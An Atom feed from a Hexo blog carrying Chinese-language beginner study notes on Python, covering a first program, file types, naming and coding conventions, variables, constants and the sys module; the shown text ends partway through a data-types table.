<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fengchao1847081353.github.io/"/>
  <updated>2019-06-03T14:08:29.776Z</updated>
  <id>https://fengchao1847081353.github.io/</id>
  
  <author>
    <name>Fengsir</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第1章 进入Python的世界</title>
    <link href="https://fengchao1847081353.github.io/2019/06/23/%E7%AC%AC1%E7%AB%A0%20%E8%BF%9B%E5%85%A5Python%E7%9A%84%E4%B8%96%E7%95%8C/"/>
    <id>https://fengchao1847081353.github.io/2019/06/23/第1章 进入Python的世界/</id>
    <published>2019-06-23T14:46:43.000Z</published>
    <updated>2019-06-03T14:08:29.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第1章-进入Python的世界"><a href="#第1章-进入Python的世界" class="headerlink" title="第1章 进入Python的世界"></a>第1章 进入Python的世界</h1><p>Python是一种动态解释型语言的编程语言</p><h4 id="1-1-Python的由来"><a href="#1-1-Python的由来" class="headerlink" title="1.1 Python的由来"></a>1.1 Python的由来</h4><p>Python语言是由Guido van Rossum在1989年开发，在1991年正式发表.</p><h4 id="1-2-Python的特色"><a href="#1-2-Python的特色" class="headerlink" title="1.2 Python的特色"></a>1.2 Python的特色</h4><p><strong>1</strong>.<strong>面向对象特性</strong></p><p><strong>2</strong>.<strong>内置的数据结构</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括元组、列表、字典、集合等</span><br></pre></td></tr></table></figure><p><strong>3</strong>.<strong>简单性</strong></p><p><strong>4</strong>.<strong>健壮性</strong></p><p><strong>5</strong>.<strong>跨平台性</strong></p><p><strong>6</strong>.<strong>可扩展性</strong></p><p><strong>7.动态性</strong></p><p><strong>8.强语言性</strong></p><p><strong>9.应用广泛</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python语言应用于数据库、网络、数学计算、WEB开发、操作系统扩展领域</span><br></pre></td></tr></table></figure><h4 id="1-3-第一个Python程序"><a href="#1-3-第一个Python程序" class="headerlink" title="1.3 第一个Python程序"></a>1.3 第一个Python程序</h4><p>​    <strong>python的源代码文件以“py”作为后缀，创建一个名为hello.py的文件，输出字符串“hello word”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><ul><li><h5 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h5></li></ul><p><strong>1.第一行代码相当于C语言中的main函数，是python程序的入口</strong></p><p> <strong>main函数解释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.main函数就是第一个被调用的函数，和定义的位置、前后顺序无关</span><br><span class="line">2.在main函数之前定义一个全局变量，或者定义一个函数，都不影响main首先被执行。</span><br><span class="line">3.main()函数称之为主函数，一个C程序总是从main()函数开始执行的。</span><br></pre></td></tr></table></figure><p><strong>2.第二行代码使用了print语句输出字符串“hello world”</strong></p><p><strong>结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure><p><strong>Python的print语句用于输出字符串的内容，即把双引号的内容输出到控制台，Python的输入输出是通过“流”实现的，上述prin语句把字符串的内容输出到标准流，即输出到控制台，流也可以把结果输出到文件。</strong></p><ul><li><strong>python的运行</strong></li></ul><p>​       <strong>python  源文件+python路径</strong></p><p>​       <strong>python_file.py表示Python的源文件，python_file_path表示文件所在的路径</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python python_file_path  +  python_file.py</span><br><span class="line">python C:\user\hello.py</span><br></pre></td></tr></table></figure><h4 id="1-4-1-Python的下载与安装"><a href="#1-4-1-Python的下载与安装" class="headerlink" title="1.4.1  Python的下载与安装"></a>1.4.1  Python的下载与安装</h4><p><strong>官网</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.python.org</span><br></pre></td></tr></table></figure><p><strong>支持系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">Linux</span><br><span class="line">Unix</span><br><span class="line">其他系统...</span><br></pre></td></tr></table></figure><h4 id="1-5-Python的开发工具"><a href="#1-5-Python的开发工具" class="headerlink" title="1.5 Python的开发工具"></a>1.5 Python的开发工具</h4><p><strong>例如 Komodo、PythonWin、Eclipse、PyCharm,支持图形化操作具备编辑、调试等功能</strong></p><p><strong>比较好用的工具</strong></p><p><strong>PyCharm</strong></p><p><strong>Eclipse</strong></p><h4 id="1-6-运行"><a href="#1-6-运行" class="headerlink" title="1.6 运行"></a>1.6 运行</h4><p><strong>#！/bin/python</strong></p><p><strong>可以在UNIX平台下运行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第1章-进入Python的世界&quot;&gt;&lt;a href=&quot;#第1章-进入Python的世界&quot; class=&quot;headerlink&quot; title=&quot;第1章 进入Python的世界&quot;&gt;&lt;/a&gt;第1章 进入Python的世界&lt;/h1&gt;&lt;p&gt;Python是一种动态解释型语言的编
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>零基础学Python</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%AD%A6Python/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/零基础学Python/</id>
    <published>2019-06-03T14:45:43.000Z</published>
    <updated>2019-06-03T14:08:13.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="零基础学Python"><a href="#零基础学Python" class="headerlink" title="零基础学Python"></a>零基础学Python</h1><p>[TOC]</p><hr><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><h4 id="第一篇-python-语言基础"><a href="#第一篇-python-语言基础" class="headerlink" title="第一篇  python 语言基础"></a>第一篇  python 语言基础</h4><ul><li style="list-style: none"><input type="checkbox" checked> ##### 第1章 进入Python的世界</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第2章 Python必须知道的基础语法</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第3章 Python控制语句</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第4章 Python数据结构</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第5章 模块与函数</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第6章 字符串与正则表达式</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第7章 使用Python处理文件</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第8章 面向对象编程</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第9章 异常处理与程序调试</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第10章  数据库编程</li></ul><p><strong>争取在一个月左右，重新温习Python的语法并学习新的知识点，能将Python的70%掌握，每天进行学习记录。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;零基础学Python&quot;&gt;&lt;a href=&quot;#零基础学Python&quot; class=&quot;headerlink&quot; title=&quot;零基础学Python&quot;&gt;&lt;/a&gt;零基础学Python&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>第2章 Python必须知道成的基础语法</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/%E7%AC%AC2%E7%AB%A0-Python%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E6%88%90%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/第2章-Python必须知道成的基础语法/</id>
    <published>2019-06-03T14:45:37.000Z</published>
    <updated>2019-06-03T14:08:46.889Z</updated>
    
    <content type="html"><![CDATA[<p>第2章 Python必须知道成的基础语法</p><p>本章的知识点</p><ul><li>Python文件的扩展名</li><li>Python的编码规则</li><li>数据类型</li><li>变量和常量的定义和使用</li><li>运算符及表达式</li></ul><p>2.1 Python的文件类型</p><p>python文件类型分为三种，分别是源代码、字节代码、优化代码。这些代码可以直接运行</p><p>2.1.1 源代码</p><p>Python源代码的扩展名是以py结尾，可在控制台下运行。Python语言写的程序不需要编译成二进制代码，可可以直接运行源代码。pyw是windows下开发图形用户接口。以py和pyw为后缀名的文件可以使用文本工具打开，并修改文件的内容</p><p>2.1.2 字节代码</p><p>Python源文件编译后生成pyc后缀文件，pyc是编译过的字节文件，这种文件不可以使用文本编辑工具打开或者修改。pyc文件与平台无关，因此Python的程序可以运行在Windows、UNIX、Linux等操作系统上。py文件直接运行即可获得pyc类型的文件，或通过脚本生成该类型的文件。</p><p>  下面这段脚本可以把hello.py编译为hello.pyc</p><pre><code>import py_compilepy_compile.compile(&apos;hello.py&apos;)</code></pre><p>  保存此脚本，运行即可得到hello.pyc文件</p><p>2.1.3 优化代码</p><p>扩展名为pyo的文件是优化过的源文件，pyo类型的文件需要用命令工具生成。pyo文件也不能用文本工具编辑打开或者修改。下面把hello.py文件编译成hello.pyo</p><p>（1）启动命令窗口，进入hello.py文件所在的目录，例如：</p><pre><code>cd /D D:\developer\python\example\02\2.1</code></pre><p>(2)在命令行输入 python-O-m py_compile hello.py,并按回车键。</p><pre><code>python -O -m py_compile hello.py</code></pre><p>代码说明</p><ul><li>参数“-O”表示生成优化代码</li><li>参数“-m”表示把导入的py_compile模块作为脚本运行。编译hello.pyo需要调用py_compile模块的compile()方法</li><li>参数“hello.py是待编译的文件名”</li><li>最后查看hello.py所在的文件目录，此时目录生成一个名为hello.pyo的文件</li></ul><p>2.2 python的编码规范</p><p>Python语言有一套自己独特的编码规则，包括命名规则、代码书写规则等</p><p>2.2.1 命名规则</p><p>1.变量名、包名、模块名</p><p> 变量名、包名、模块名通常使用小写，可使用下划线</p><pre><code>01 #变量名、模块名的命名规则02 #Filename: ruleModule.py #可理解为import ruleModule.py或者 import ruleModule0304 _rule_ = &quot;rule infomation&quot;</code></pre><p>代码说明</p><ul><li>第2行声明模块的名称，模块采用小写。也可以不指定模块名，以py后缀的文件就是一个模块。模块名就是文件名</li><li>第4行定义了一个全局变量_rule</li></ul><ol start="2"><li><p>类名、对象名</p><p>1.类名首字母采用大写，对象采用小写</p><p>2.类的 ”属性“ 和 “方法名” 以 ”对象“ 作为前缀。类的私有变量</p><p>3.私有方法有一下两个下划线作为前缀。下面这段代码演示了累的定义和实例化的规范写法</p><p>4.方法名首字母小写，其后的单词首字母大写</p><p> class Student:                  #类名大写</p><pre><code>__name = &quot;&quot;                    #私有变量前必须有两个下划线def __init__(self, name):    self.__name = name        #self相当于java的thisdef getName(self):            #方法名首字母小写，其后每个单词的首字母大写    return self.__name</code></pre><p> if <strong>name</strong> == “<strong>main</strong>“:</p><pre><code>student = Student(&quot;borphi&quot;)print(student.getName())</code></pre></li></ol><p>涉及的函数</p><pre><code>1.class函数           #创建类2.私有变量               #类似私有方法，在变量前加两个_,比如__fool3.一、java中this关键字主要有三个应用：     (1)this调用本类中的属性，也就是类中的成员变量；     (2)this调用本类中的其他方法；     (3)this调用本类中的其他构造方法，调用时要放在构造方法的首行。    this, 一个官方的说法是，this首先是一个对象,它代表调用这个函数的对象。4.</code></pre><p>代码说明</p><ul><li>第1行定义了一个名为Student的类，类名首字母大写</li><li>第2行定义了一个私有的实例变量，变量名前有两个下划线</li><li>第4行代码使用self前缀说明__name变量属于Student类</li><li>第5行代码定义了一个公有方法，方法名首字母小写，其后的单词Name首字母大写。函数的命名规则和方法方法名相同</li><li>第9行代码创建了一个student对象，对象名小写</li></ul><p>3.函数名</p><p>   函数名通常使用小写，并采用下划线或单词首字母大写增加名名称的可读性，导入的函数以及模块名做前缀。</p><pre><code>randrange(start, stop[,step])</code></pre><p>代码说明</p><ul><li>参数start表示随机所在的范围开始数字</li><li>参数stop表示随机数所在范围的结束数字，但不包括数字stop</li><li>参数step开始往后的步数。生成的随机数在[start,stop -1]的范围内，取值等于start+step</li></ul><p>例如</p><pre><code>rangrange(1, 9, 2)</code></pre><p>随机数的范围在1、3、5、7之间选取。下面这段代码演示了函数的规范写法，其中定义了一个compareNum(),该函数用于比较两个数字的大小，并返回对应的结果</p><pre><code>#函数的命名规则import randomdef compareNum(num1,num2):    if(num1 &gt; num2):        return 1    elif(num1 == num2):        return 0    else:        return -1num1 = random.randrange(1, 9)num2 = random.randrange(1, 9)print( &quot;num1 =&quot;,num1)print( &quot;num2 =&quot;,num2)print(compareNum(num1, num2))</code></pre><p>代码说明</p><ul><li>第2行导入了random模块</li><li>第4行代码定义一个函数compareNum(),参数num1,num2待作比较的两个变量</li><li>第5行到第10行比较两个数的大小，返回不同的结果</li><li>第11行、12行代码调用random（）函数返回两个随机数</li><li>第13、14行代码输出随机数，不同的机器，不同的执行时间得到的随机数均不相同</li><li>第15行代码调用compareNum，并把产生的随机数作为参数传入</li><li>定义函数后，最后一定输出你所定义的函数</li></ul><p>2.2.1.5  变量名的规范</p><pre><code>变量的命名应尽可能地表达此变量的作用，尽量避免缩写，以至于任何人都能理解变量名的含义。不用担心变量名的长度，长的变量名往往更清楚的表达意思</code></pre><p>2.2.2 代码缩进与冒号</p><p>   进与冒号是指通过在每行代码前输入空格或制表符的方式，表示每行代码之间的层次关系任何编程语言都需要要用代码缩进清晰程序的结构</p><p>案例</p><pre><code>x = 1if x == 1:    print( &quot;x=&quot;,x)else:    print( &quot;x=&quot;,x)    x = x+1print(&quot;x=&quot;,x)</code></pre><p>代码说明</p><ul><li>第1行代码创建了变量x,并赋值为1。在赋值运算符的两侧各添加一个空格，这是一种良好的书写习惯，挺高程序的程序的可读性</li><li>第2行代码使用了条件if，判断x的值是否1.if表达式后输入一个冒号，冒号后面的代码块与第1行代码处于同一个层次，直接从最左端书写代码</li><li><p>第3行代码表示x的值等于1时输出的结果，当if条件成立时，程序才能执行到第3行，所以第3行代码位于第2行代码的下一个层次。在编码时，首先左端输入4个空格或表键（不建议），然后书写print语句。输出结果</p><p>  x = 1</p></li><li><p>第四行代码的else关键字后是一段新的代码块。当x的值不等于1时，程序执行5、6行代码</p></li><li>第5、6行代码采用缩进式的代码风格</li><li><p>第7行输出结果</p><p>  x = 1</p></li></ul><p>2.2.3  模块导入的规范</p><p>   模块是类或函数的集合，用于处理一类问题。模块的导入和java包的导入的概念很相似。都使用import语句，在Python中，如果需要在程序中调用标准库或其他第三方库的类，需要先使用import或from…import..语句导入相关的模块。</p><ol><li>import语句</li></ol><p>下面这段代码使用import语句导入sys模块，并打印相关内容</p><pre><code>#规范导入方式import sysprint(sys.path)print(sys.arvg)</code></pre><ul><li>第2行代码使用了import语导入了sys模块，sys模块是处理系统环境的函数集合</li><li>第4行代码输出Python环境下查找路径的集合，Python默认情况下会查找sys.path返回的目录列表。列表是Python的内置的数据结构，定义了一组相同意义的数据，通常用来作为参数或者返回值</li><li>第5行代码中的sys.argv是存储输入参数的列表。默认情况下，argv自带的参数是文件名</li></ul><p>2.from…import…语句</p><pre><code>使用from..import..语句导入有所不同，区别是前者只导入模块中的一部分内容，并在命名空间中创建导入对象的引用；而后者在当前程序的命名空间中创建导入模块的引用，从而可以使用&quot;sys.path的方式调用sys模块中的内容&quot;</code></pre><p>下面这段代码实现了与上面代码相同的功能，不同的是使用了from…import…语句导入指定内容</p><pre><code>from sys import pathfrom sys import arvgprint (path)print (arvg)</code></pre><p>代码说明</p><p>第5、6行代码直接调用path、argv列表的内容，没有模块名的限定，但这种代码写法不够规范，如果程序比较复杂，导入了很多模块，阅读程序的人并了解path、arvg来自哪个模块。而通过sys.path、sys.arvg的写法可以清楚的知道path、arvg来自sys模块</p><p>2.2.4 使用空行分隔代码</p><p>  函数之间或者类的方法之间使用空行分隔，表示新的代码的开始。类和函数入口之间也用空行分隔，突出函数入口的开始。</p><p>例子</p><pre><code>class A:                        #创建一个类    def funX(self):                #def定义一个方法funX,self是类        print( &quot;funY()&quot; )    def funY(self):                #def定义一个方法funY，self是类        print( &quot;funY()&quot; )if __name__ == &apos;__main__&apos;:        #调用类A，调用funX，funY方法    a = A()    a.funX()    a.funY()</code></pre><p>代码说明</p><ul><li>第4行代码插入了一个空行，表示区分方法之间的间隔，便于阅读</li><li>第7行代码也是一个空行，因为下面的if语句是主程序的入口，用于创建类A的对象，并调用其方法</li></ul><p>2.2.5  正确的注释</p><p>（1）中文注释：如果需要代码中使用中文注释，必须在Python文件的最前面加上如下注释说明。</p><pre><code># -*- coding: UTF-8 -*-</code></pre><p>（2）跨平台注释：如果需要使Python程序运行在*unix中，最好在Python文件的最前面加下如下注释说明</p><pre><code>#！/usr/bin/python</code></pre><p>此外注释也用于调试程序，因此可以使用注释辅助调试</p><p>  注释的用法     描述                      注释的用法      描述<br>  单行注释      说明一行语句的作用               中文注释的支持    -<em>- coding: UTF-8 - </em>-<br>  块注释       说明一段代码的作用或整个程序的文件的功能    调试程序       注释可帮助程序员调试程序<br>  程序的跨平台    #/usr/bin/python                                         </p><p>2.2.6 语句的分隔</p><pre><code>在Python中的分号可以省略，主要通过换行来识别语句的结束#下面两条语句是等价的print( &quot;hello world!&quot; )print( &quot;hello world!&quot; );</code></pre><p>如果要在一行中书写多个语句，就必须使用分号分隔</p><pre><code>#使用分号分隔语句x = 1;y = 1 ;z = 1print(z,y,z)</code></pre><p>代码说明</p><ul><li>第2行代码中有3条赋值语句，语句之间需要分号隔开，如果不隔开Python解释器不能正确解释，会提示语法错误<pre><code>SyntaxError: invalid syntax</code></pre></li></ul><p>（2）Python的“\”换行符</p><p>Python支持多行写一条语句，Python使用“\”作为换行符，一条语句写在多行</p><p>例如SQL语句作为参数传递给函数</p><pre><code>#字符串的换行#写法一sql = &quot;select id,name \from dept \where name = &apos;A&apos;&quot;print(sql)#写法二sql = &quot;select id,name &quot; \      &quot;from dept&quot; \      &quot;where name = &apos;A&apos;&quot;print（sql）</code></pre><p>代码说明</p><ul><li><p>写法一只使用了一对双引号，把SQL语句分为select、from、where 3部分分别书写。</p><p>  select id,name, from dept where name = ‘A’</p></li><li><p>写法二比第一种可读性强，可以使用空格和制表符对齐语句，使代码显得更工整，简短代码不推荐换行写法</p><p>  select id,name, from dept where name = ‘A’</p></li></ul><p>2.3 变量和常量</p><p>变量是计算机内存中的一块区域，变量可以储存任何值，而且值可以改变</p><p>常量是一块只读的内存区域，常量一旦初始化就不能修改</p><p>2.3.1 变量的命名</p><pre><code>变量是由 &quot;字母”、“数字”、“下换线&quot; 成，变量的 ”第一个字符“ 必须是字母或下划线，其他字符可以由字母、数字或下划线组成。</code></pre><p>例如</p><pre><code># 正确的变量命名var_1 = 1print （var_1）_var = 2print(_var)</code></pre><p>代码说明</p><ul><li>第2行代码定义了一个名为var_1的变量，改变量的初始值为1。这个变量以字母开头后面的字符由字母、下划线和数字组成</li><li>第4行代码定义了一个名为_var1的变量，该变量的初始值为2，这个变量以下划线开头，后面的字符由字母和数字组成</li></ul><p>错误的变量名方式</p><pre><code>#错误的变量命名1_var = 3print (1_var)$var = 4print ($var)</code></pre><p>代码说明</p><ul><li>第2行代码定义了一个名为1_var的变量，该变量以数字开头，后面的字符由数字下划线组成</li><li>第3行代码，变量以数字开头、不符合变量命名规则</li><li>第4行代码定义了一个名为$var的变量 ,变量以符号开头</li><li>第5行代码，变量以$开头，不符合变量名的命名规则</li></ul><p>2.3.2 变量的赋值</p><p>   Python中的变量不需要声明，变量的赋值操作即是变量声明和定义过程。每个变量在内存中创建，都包括变量的标识、名称和数据这些信息</p><p><img src="/2019/06/03/第2章-Python必须知道成的基础语法/第2章-Python必须知道成的基础语法\变量的内部结构.png" alt></p><p>变量的内部结构</p><p>变量x的标识  –&gt; id(x) —-&gt;x |1   </p><p>  上面的代码创建了变量x，并赋值为1，如上所示。</p><p>  Python中一次新的赋值，并创建一个新的变量。即使变量的名称相同，变量的标识并不相同</p><pre><code>#一次新的赋值操作，并创建一个新的变量x = 1print (id(x))x = 2print( id(x) )</code></pre><p>代码说明</p><ul><li>第2行代码定义了一个名为x的变量，该变量的初始值为1</li><li><p>第3行代码，输出变量x的标识。输出结果如下</p><p>  11229424</p></li><li><p>第4行代码再次定义了一个x的变量，该变量的初始值为2。该变量与前面的变量x并不是同一变量</p></li><li><p>第5行代码，输出变量x的标识。输出结果如下</p><p>  11229412</p></li></ul><p>如果变量没有赋值，Python将认为变量不存在</p><p>2.3.3  局部变量</p><p>   局部变量是只能在函数或代码段内使用的变量。函数或代码段一旦结束，局部变量的生命周期就结束。局部变量的作用范围只在被创建的函数内有效。例如，文件1的fun()中定义了一个局部变量，则该局部变量只能被fun()访问，而不能被fun2()访问，也不能被文件2访问。</p><pre><code>#局部变量def fun():    local = 1    print(local)fun()</code></pre><p>代码说明</p><ul><li>第二行代码定义了一个函数fun()</li><li>第3行代码定义了一个局部变量local</li><li><p>第4行代码输出local的值，输出结果如下</p><p>  1</p></li></ul><ul><li>第5行代码调用函数fun()。此时已超出local变量的作用范围</li></ul><p>2.3.4 全局变量</p><pre><code>全局变量是能够被不同的函数、类或文件共享的变量，在函数之外定义的变量都可以称为全局变量。全局变量可以被文件内部的任何函数和外部文件访问。例如，如果文件1定义了一个全局变量，文件1中的函数fun()可以访问该全局变量，此外，该全局变量也能被文件1、文件2访问</code></pre><p><img src="/2019/06/03/第2章-Python必须知道成的基础语法/第2章-Python必须知道成的基础语法.png" alt></p><p>   全局变量通常在文件的开始处定义，下面定义了两个全局变量 _ a 、_b 和add()、sub()，这两个函数将调用全局变量执行加法和减法计算</p><pre><code>#在文件开头定义全局变量_a = 1_b = 2def add():    global _a    _a = 3    return &quot;_a + b =&quot;,_a + _bdef sub():    global _b    _b = 4    return &quot;_a + _b&quot;,_a - _bprint (add())print(sub())</code></pre><p>代码说明</p><ul><li>第2行代码定义了一个名为_a的全局变量，这个变量的作用范围从定义处到文件的结尾。之所以使用下划线是为了区分于其他变量，引起对全局变量出现的重视</li><li>第3行代码定义了一个名为 _b的全局变量。同样__b的作用范围从定义处到文件的结尾</li><li>第4行代码定义了一个函数add()，用于执行加法计算</li><li>第5行代码引用了全局变量_a。这里使用global关键字，global用于引用全局变量</li><li>第6行代码对全局变量_a重新赋值</li><li>第7行代码返回_a  + _b的值</li><li>第8行代码定义了一个函数sub()，用于执行加减法运算。函数内的实现方式和add()相同</li></ul><p>涉及函数</p><pre><code>global 关键字允许你修改当前范围之外的变量。它用于创建全局变量并在本地上下文中更改变量。可以理解为调用全局变量</code></pre><p>例子：</p><pre><code>c = 0                        #定义全局变量cd = 2                        #定义全局变量ddef add():                    #定义add()函数，用于加法计算    global c                #程序实现的功能内容    c = c + 2    print(&quot;Insid add():&quot;,c) #输出add()函数add()                        #引用完成全局变量，局部变量结束def sub():    global d    d = d + 2    print(&quot;In main:&quot;,d)sub()</code></pre><p>注意：</p><pre><code>变量名相同的两个变量可能并不是同一变量，变量的名称只是起标识的作用变量出现的位置不同，变量的含义也不同</code></pre><p>可以把全局变量放到专门文件，创建一个名为gl.py的文件</p><pre><code>#全局变量_a = 1_b = 2</code></pre><p>也可调用模块调用全局变量</p><pre><code>#调用全局变量import gl_a = 1_b = 2def fun():    print(gl._a)    print(gl._b)fun()</code></pre><p>代码说明</p><ul><li>第2行代码导入前面创建的文件gl.py,即模块gl</li><li>第3行代码定义函数fun(),该函数调用全局变量_a 和 _b。这里不需要global,引用gl.py中的全局变量。使用前导符定位</li></ul><p>2.3.5  常量</p><p>常量是指一旦初始化后就不能改变的变量，例如数字 1、字符串“abc”都是常量</p><p>定于常量模块const</p><pre><code>class _const:    class ConstError(TypeError):pass    def __setattr__(self,name,value):        if self.__dict__.has_key(name):            raise self.ConstError, &quot;Can&apos;t rebind const(%s)&quot; %name        self.__dict__[name]=valueimport syssys.modules[__name__]=_const()</code></pre><p>代码说明</p><ul><li>这个类定义了一个方法<strong> setattr()和一个异常类型ConstError,    ConstError类继承自TypeError。通常调用字典 </strong> dict __,判断定义的常量是否包含在字典中，如果字典包含此常量，将抛出异常。否则，给新创建的常量赋值</li><li>最后两行代码的作用是把const类注册到sys.modules这个全局字典中</li></ul><p>调用const函数</p><pre><code>import constconst.magic = 23const.magic = 33</code></pre><ul><li>第3行代码修改常量magic的值，抛出异常</li></ul><p>涉及函数</p><p>sys模块</p><pre><code>1: sys是python自带模块. 利用 import 语句输入sys 模块。 当执行import sys后, python在 sys.path 变量中所列目录中寻找 sys 模块文件。sys.argv: 实现从程序外部向程序传递参数。sys.exit([arg]): 程序中间的退出，arg=0为正常退出。sys.getdefaultencoding(): 获取系统当前编码，一般默认为ascii。sys.setdefaultencoding(): 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding(&apos;utf8&apos;)，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）sys.getfilesystemencoding(): 获取文件系统使用编码方式，Windows下返回&apos;mbcs&apos;，mac下返回&apos;utf-8&apos;.sys.path: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。sys.platform: 获取当前系统平台。sys.stdin,sys.stdout,sys.stderr: stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们</code></pre><p>sys.modules 模块</p><pre><code>Python中所有加载到内存的模块都放在sys.modules。sys.modules是一个全局字典，字典sys.modules对于加载模块起到了缓冲的作用,当import一个模块时首先会在这个列表中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用import的模块的Local名字空间中。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。件，模块文件可以是py、pyc、pyd，找到后将模块载入内存，并加入到sys.modules中，并将名称导入到当前的Local名字空间。</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;第2章 Python必须知道成的基础语法&lt;/p&gt;
&lt;p&gt;本章的知识点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python文件的扩展名&lt;/li&gt;
&lt;li&gt;Python的编码规则&lt;/li&gt;
&lt;li&gt;数据类型&lt;/li&gt;
&lt;li&gt;变量和常量的定义和使用&lt;/li&gt;
&lt;li&gt;运算符及表达式&lt;/li
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>第2章 Python必须知道的基础语法--数据类型</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/%E7%AC%AC2%E7%AB%A0%20Python%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95--%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/第2章 Python必须知道的基础语法--数据类型/</id>
    <published>2019-06-03T14:45:37.000Z</published>
    <updated>2019-06-03T14:08:37.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第2章-Python必须知道的基础语法–数据类型"><a href="#第2章-Python必须知道的基础语法–数据类型" class="headerlink" title="第2章 Python必须知道的基础语法–数据类型"></a>第2章 Python必须知道的基础语法–数据类型</h1><h3 id="2-4-数据类型"><a href="#2-4-数据类型" class="headerlink" title="2.4 数据类型"></a>2.4 数据类型</h3><p>   <strong>数据类型是构成编程语言语法的基础，不同的编程语言有不同的数据类型，但都具有常用的几种数据类型。Python有几种内置的数据类型——数字、字符串、元组、列表和字典</strong></p><h4 id="2-4-1-数字"><a href="#2-4-1-数字" class="headerlink" title="2.4.1 数字"></a>2.4.1 数字</h4><p>​    <strong>Python3的数字类型分为  整型、浮点型、布尔型、分数类型、复数类型。使用Python编写程序时，不需要声明变量的类型。由Python内置的基本数据类型来管理变量，在后台实现数值与类型的关联以及类型转换等操作</strong></p><table><thead><tr><th>操作</th><th>说明</th><th>bool</th><th>int</th><th>long</th><th>float</th><th>complex</th></tr></thead><tbody><tr><td>x ** y</td><td>指数运算</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>+x</td><td>符号不变</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>-x</td><td>符号取反</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>~x</td><td>按位取反</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>x * y</td><td>乘法</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>x / 